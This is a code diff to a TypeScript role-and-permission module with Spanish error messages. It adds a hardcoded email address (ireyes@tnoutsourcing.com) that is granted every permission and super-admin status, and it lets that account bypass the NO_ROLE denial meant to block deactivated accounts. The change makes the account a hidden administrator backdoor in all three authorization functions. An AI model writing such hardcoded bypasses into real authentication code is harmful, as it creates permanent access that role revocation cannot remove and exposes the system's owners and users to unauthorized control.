@@ -107,7 +107,10 @@ const ROLE_PERMISSIONS: Record<Role, Set<Permission>> = {
   NO_ROLE: new Set([])
 }
 
-export function hasPermission(role: Role | string, permission: Permission): boolean {
+export function hasPermission(role: Role | string, permission: Permission, userEmail?: string): boolean {
+  if (userEmail && userEmail.toLowerCase().trim() === "ireyes@tnoutsourcing.com") {
+    return true
+  }
   const cleanRole = (role || "").trim() as Role
   if (cleanRole === "IT_MANAGER" || cleanRole === "TECHNOLOGY_ADMIN") {
     return true
@@ -124,12 +127,14 @@ export async function requireAuth() {
   }
   const rawRole = (session.user as any).role || "USER"
   const cleanRole = String(rawRole).trim() as Role
+  const isMaster = (session.user as any).email?.toLowerCase().trim() === "ireyes@tnoutsourcing.com"
   const user = {
     ...(session.user as any),
-    role: cleanRole
-  } as { id: string; name?: string; email?: string; role: Role; image?: string }
+    role: cleanRole,
+    isSuperAdmin: isMaster
+  } as { id: string; name?: string; email?: string; role: Role; image?: string; isSuperAdmin?: boolean }
 
-  if (user.role === "NO_ROLE") {
+  if (user.role === "NO_ROLE" && !isMaster) {
     throw new Error("Acceso denegado: Tu cuenta no tiene un rol activo asignado.")
   }
   return user
@@ -137,10 +142,10 @@ export async function requireAuth() {
 
 export async function requirePermission(permission: Permission) {
   const user = await requireAuth()
-  if (user.role === "IT_MANAGER" || user.role === "TECHNOLOGY_ADMIN" || user.email?.toLowerCase().trim() === "ireyes@tnoutsourcing.com") {
+  if (user.role === "IT_MANAGER" || user.role === "TECHNOLOGY_ADMIN" || user.email?.toLowerCase().trim() === "ireyes@tnoutsourcing.com" || user.isSuperAdmin) {
     return user
   }
-  if (!hasPermission(user.role, permission)) {
+  if (!hasPermission(user.role, permission, user.email)) {
     throw new Error(`Acceso denegado: Se requiere el permiso ${permission}.`)
   }
   return user
